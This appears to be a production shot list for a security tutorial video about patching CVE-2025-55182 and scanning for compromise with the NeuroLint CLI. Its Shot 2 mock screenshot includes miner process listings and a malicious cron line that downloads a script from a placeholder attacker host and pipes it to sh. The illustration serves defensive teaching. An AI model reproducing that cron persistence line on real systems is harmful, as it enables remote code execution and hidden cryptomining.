# Shot List - CVE-2025-55182 Complete Fix Video

## Pre-Production Checklist
- [ ] Install asciinema: `sudo apt install asciinema` (or your OS equivalent)
- [ ] Make recording scripts executable: `chmod +x /app/video-production/scripts/*.sh`
- [ ] Test NeuroLint commands work
- [ ] Verify terminal size: 120x30 or similar (consistent across all recordings)
- [ ] Set terminal color scheme (dark background recommended)

---

## SHOT 1: Hook & Timeline (0:00-0:50)
**Type:** Motion graphics + Voiceover

**Assets Needed:**
- [ ] Timeline graphic showing Dec 3 → Dec 7 → Today
- [ ] Split screen visual: Patched code vs. running malware process
- [ ] Text overlays for key phrases

**Production:**
1. Create timeline in Keynote/PowerPoint/After Effects
2. Animate dates appearing
3. Highlight Dec 3-7 exploitation window
4. Show split screen of clean code + ps aux showing malicious process

**Export:** 1920x1080, 30fps, MP4

---

## SHOT 2: Eduardo Borges Breach Case (0:50-2:15)
**Type:** Screenshots + Annotations

**Assets Needed:**
- [ ] Eduardo's Twitter thread screenshots (if available)
- [ ] Terminal showing:
  - `ps aux | grep 3ZU1yLK4` (361% CPU)
  - `ps aux | grep nginxs`
  - `crontab -l` showing malicious entries
  - `netstat -an | grep 4242` (c3pool connection)

**Production:**
1. Screenshot or recreate terminal outputs
2. Add annotations (red arrows, circles)
3. Highlight suspicious elements
4. Create diagram: Vulnerability → Exploit → Patch → Infection Remains

**Mock Commands (for screenshot):**
```bash
# Terminal 1: Malicious process
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
www-data 12845 361.2  2.3 142524 47892 ?       Sl   Dec03 1245:12 ./3ZU1yLK4

# Terminal 2: Fake services
www-data  8234  98.4  1.8  98234 36472 ?       Ss   Dec03  642:38 nginxs
www-data  8456  87.2  1.6  87654 32156 ?       Ss   Dec03  563:22 apaches

# Terminal 3: Cron job
@reboot /tmp/.hidden/miner
*/5 * * * * /tmp/3ZU1yLK4 || wget -O- http://attacker.com/x | sh
```

**Export:** 1920x1080 screenshots

---

## SHOT 3: Why Patching Isn't Enough (2:15-3:30)
**Type:** Animation + Diagram

**Assets Needed:**
- [ ] Door metaphor animation (door opening → intruder enters → door closes but intruder remains)
- [ ] Checklist appearing with items:
  - Code-level threats (backdoors, credential harvesting, obfuscation)
  - System-level threats (miners, reverse shells, containers, cron)

**Production:**
1. Create door animation (simple motion graphics)
2. Show Dec 3-7 window highlighted on calendar
3. Animate checklist items appearing one by one
4. Use icons for each threat type

**Tool Suggestions:** After Effects, Keynote, Canva

**Export:** 1920x1080, 30fps, MP4

---

## SHOT 4: Live Demo - Patch (3:30-4:30)
**Type:** Terminal recording (asciinema)

**Recording:**
```bash
cd /app/video-production/scripts
./record-demo1-patch.sh
```

**What It Shows:**
1. `npx @neurolint/cli security:cve-2025-55182 . --dry-run`
2. Output showing vulnerable versions detected
3. `npx @neurolint/cli security:cve-2025-55182 . --fix`
4. `npm install`
5. Success message

**Post-Production:**
- [ ] Convert .cast to MP4: `asciinema render demo1-patch-vulnerability.cast demo1.mp4`
- [ ] Add text overlays for key moments
- [ ] Optionally add zoom-in effects on important output

**File:** `/app/video-production/recordings/demo1-patch-vulnerability.cast`

---

## SHOT 5: Live Demo - Scan (4:30-6:00)
**Type:** Terminal recording (asciinema)

**Recording:**
```bash
cd /app/video-production/scripts
./record-demo2-scan.sh
```

**What It Shows:**
1. `npx @neurolint/cli security:scan-compromise . --mode=deep`
2. Scanning progress (11 categories)
3. Findings appearing:
   - [HIGH] backdoor-route.ts
   - [HIGH] obfuscated-malware.js
   - [HIGH] credential-harvester.ts
4. Summary statistics

**Post-Production:**
- [ ] Convert .cast to MP4
- [ ] Highlight categories as they're mentioned in voiceover
- [ ] Zoom on findings section
- [ ] Add icons next to threat categories

**File:** `/app/video-production/recordings/demo2-scan-compromise.cast`

---

## SHOT 6: Complete Workflow (6:00-7:00)
**Type:** Terminal recording (asciinema)

**Recording:**
```bash
cd /app/video-production/scripts
./record-demo3-complete.sh
```

**What It Shows:**
1. All four steps in sequence:
   - Patch
   - Install
   - Scan
   - Create baseline
2. Checklist appearing alongside terminal
3. Success confirmation

**Post-Production:**
- [ ] Convert .cast to MP4
- [ ] Add animated checklist sidebar
- [ ] Check marks appearing as steps complete
- [ ] Final success screen

**File:** `/app/video-production/recordings/demo3-complete-workflow.cast`

---

## SHOT 7: Closing & End Screen (7:00-7:45)
**Type:** B-roll + End Screen

**Assets Needed:**
- [ ] B-roll of code scrolling
- [ ] Terminal activity
- [ ] NeuroLint logo
- [ ] End screen with:
  - GitHub link + QR code
  - NPM link
  - Docs link
  - Subscribe button
  - Related video suggestions

**Production:**
1. Film/capture clean code footage
2. Create end screen in YouTube Studio or design tool
3. Ensure links are clickable
4. Add music fade-out

**Export:** 1920x1080, end screen overlay

---

## Technical Requirements

### Terminal Setup
- **Size:** 120 columns × 30 rows (or 100×24 for mobile optimization)
- **Font:** Monospace, 14-16pt
- **Color scheme:** Dark background (high contrast)
- **Shell:** Bash with clear PS1 prompt

### Asciinema Settings
```bash
# Set terminal size before recording
export COLUMNS=120
export LINES=30

# Recording flags (already in scripts)
--idle-time-limit 1.5  # Removes long pauses
```

### Video Export
- **Resolution:** 1920×1080 (1080p)
- **Frame rate:** 30fps
- **Format:** MP4 (H.264)
- **Audio:** 48kHz, AAC

---

## Recording Order (Recommended)

1. **Start with terminal recordings** (Shots 4-6)
   - These are the hardest to redo
   - Record multiple takes
   - Choose best performance

2. **Then graphics** (Shots 1, 3)
   - Can adjust timing to match voiceover
   - Easier to iterate

3. **Screenshots last** (Shot 2)
   - Can recreate anytime
   - Adjust based on available time

4. **Voiceover**
   - Record after visuals are final
   - Match pacing to visual timing
   - Re-record sections as needed

5. **Final assembly**
   - Edit in sequence
   - Add transitions
   - Color correction
   - Audio mixing
   - Export final video

---

## Quality Checklist

### Before Publishing:
- [ ] All terminal commands execute correctly
- [ ] Text is readable at 1080p (and 480p for mobile)
- [ ] Audio is clear and consistent volume
- [ ] No long pauses (idle-time-limit working)
- [ ] Links in description are clickable
- [ ] Timestamps in description match video
- [ ] End screen appears at right time
- [ ] Thumbnail is eye-catching
- [ ] Title includes CVE number
- [ ] Tags are comprehensive
